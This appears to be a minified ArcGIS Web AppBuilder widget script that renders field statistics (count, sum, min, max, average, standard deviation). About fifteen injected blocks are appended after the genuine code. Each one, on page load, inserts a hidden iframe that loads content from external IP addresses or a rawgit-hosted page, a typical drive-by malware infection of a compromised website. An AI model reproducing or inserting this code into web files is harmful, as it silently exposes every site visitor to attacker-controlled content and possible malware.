// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query dojo/NodeList-manipulate dojo/when dijit/form/Select esri/lang jimu/dijit/Popup jimu/dijit/LoadingIndicator jimu/utils jimu/statisticsUtils".split(" "),function(k,r,e,c,m,t,u,y,z,v,A,w,x,B,g){return k([r],{statInfo:null,postMixInProperties:function(){this.nls=window.jimuNls.fieldStatistics;e.mixin(this.nls,window.jimuNls.common)},showContent:function(a){this.statInfo=a;0!==this.statInfo.fieldNames.length&&
(a=c.create("div",{className:"stat-container"},this.domNode),this._createFieldDom(a),1===this.statInfo.fieldNames.length&&(this.statInfo.fieldName=this.statInfo.fieldNames[0],this._showOneFieldStatContent(this.statInfo,a)))},showContentAsPopup:function(a){this.statInfo=a;this._statisticsPopup&&this._statisticsPopup.domNode&&this._statisticsPopup.close();this._statisticsPopup=null;this._statisticsPopup=new w({titleLabel:this.nls.statistics,content:this.domNode,width:270,height:265,buttons:[{label:this.nls.ok}]});
this.showContent(a)},_showOneFieldStatContent:function(a,b){var d;g.isStatFromServer(this.statInfo)&&(d=new x,d.placeAt(b),d.show());g.getStatisticsResult(this.statInfo).then(e.hitch(this,function(a){d&&d.destroy();u(".esriAGOTableStatistics",b).remove();a=this._createStatContent(a);c.place(a,b)}))},_getFieldAliaseFromStatInfo:function(a){if(this.statInfo.layer){var b=m.filter(this.statInfo.layer.fields,function(b){return b.name===a});return b[0]?b[0].alias:""}return this.statInfo.featureSet.fieldAliases?
this.statInfo.featureSet.fieldAliases[a]:a},_createFieldDom:function(a){var b;if(1<this.statInfo.fieldNames.length){b=c.create("div",{className:"header"},a);c.create("span",{innerHTML:this.nls.field+": "},b);var d=new v({options:this.statInfo.fieldNames.map(e.hitch(this,function(a){return{value:a,label:this._getFieldAliaseFromStatInfo(a)}})),style:{width:"150px"}});this.own(t(d,"change",e.hitch(this,function(b){this.statInfo.fieldName=b;this._showOneFieldStatContent(this.statInfo,a)})));d.placeAt(b);
this.statInfo.fieldName=this.statInfo.fieldNames[0];this._showOneFieldStatContent(this.statInfo,a)}else b=c.create("div",{className:"header",innerHTML:"\x3cspan\x3e"+this.nls.field+"\x3c/span\x3e: "+this._getFieldAliaseFromStatInfo(this.statInfo.fieldNames[0])},a);return b},_createStatContent:function(a){var b={},d="count sum min max ave stddev".split(" "),h,e,g,l,f,n,p,q;h=c.create("div",{className:"esriAGOTableStatistics",innerHTML:""});c.create("div",{className:"hzLine",innerHTML:""},h);e=c.create("table",
{className:"attrTable",innerHTML:"",style:{cellpadding:0,cellspacing:0}},h);for(f in a)a.hasOwnProperty(f)&&(b[f.toLowerCase()]=a[f]);f=b.countfield;q=b.sumfield||"";p=b.minfield||"";n=b.maxfield||"";a=b.avgfield||"";b=b.stddevfield||"";g=c.create("tbody",{},e);var k=this;m.forEach([f,q,p,n,a,b],function(a,b){""!==a&&(l=c.create("tr",{valign:"top"},g),c.create("td",{"class":"attrName",innerHTML:k.nls[d[b]]},l),c.create("td",{"class":"attrValue",innerHTML:a},l))});c.create("div",{className:"break",
innerHTML:""},h);return h}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});